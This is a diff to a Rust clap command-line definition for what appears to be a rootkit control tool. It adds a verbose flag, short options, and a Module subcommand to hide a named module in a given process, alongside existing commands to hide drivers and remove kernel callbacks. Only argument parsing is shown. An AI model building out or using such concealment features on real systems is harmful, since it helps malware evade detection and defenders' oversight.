@@ -1,6 +1,6 @@
 #![allow(non_camel_case_types)]
 
-use clap::{arg, Parser, Subcommand, ValueHint};
+use clap::{arg, Parser, Subcommand, ValueHint, ArgAction};
 
 /// The main command-line interface struct.
 #[derive(Parser)]
@@ -9,6 +9,10 @@ pub struct Cli {
     /// The command to be executed.
     #[command(subcommand)]
     pub command: Commands,
+
+    /// Activate verbose mode (-v, -vv for additional levels)
+    #[arg(short, long, action = ArgAction::Count)]
+    pub verbose: u8,
 }
 
 /// Enum representing the available top-level commands.
@@ -37,7 +41,7 @@ pub enum Commands {
         unhide: bool,
         
         /// Enumerate the drivers.
-        #[arg(long)]
+        #[arg(long, short)]
         list: bool,
 
         /// Name Driver
@@ -58,12 +62,13 @@ pub enum Commands {
         #[command(subcommand)]
         sub_command: RegistryCommands
     },
+
     /// Operations related to Module.
     Module {
-        /// The process ID for enumerate modules.
-        #[arg(short, long, required = true)]
-        pid: u32,
+        #[command(subcommand)]
+        sub_command: ModuleCommands
     },
+
     /// Operations related to Callback.
     Callback {
         /// Enumerate callback.
@@ -82,7 +87,7 @@ pub enum Commands {
         #[arg(long, short, required = true)]
         callback: Callbacks,
 
-        // Restore callback.
+        /// Restore callback.
         #[arg(long)]
         restore: Option<usize>,
     },
@@ -230,7 +235,7 @@ pub enum ProcessCommands {
     /// Lists protected or hidden processes
     Enumerate {
         /// Enumerate Processes.
-        #[arg(long, required = true)]
+        #[arg(long, short, required = true)]
         list: bool,
         // Types Enumerate
         #[arg(long, short, required = true)]
@@ -261,6 +266,28 @@ pub enum MisCommands {
         #[arg(long)]
         start: bool,
     },
+}
+
+/// Enum representing the subcommands for module operations.
+#[derive(Subcommand)]
+pub enum ModuleCommands {
+    /// Hide the module.
+    Hide {
+        /// The module to hide.
+        #[arg(short, long, required = true)]
+        module: String,
+
+        /// The pid to module.
+        #[arg(short, long, required = true)]
+        pid: u32,
+    },
+    
+    /// Enumerate modules.
+    Enumerate {
+        /// The process ID for enumerate modules.
+        #[arg(short, long, required = true)]
+        pid: u32,
+    }
 }
 
 /// Enum representing the subcommands for thread operations.
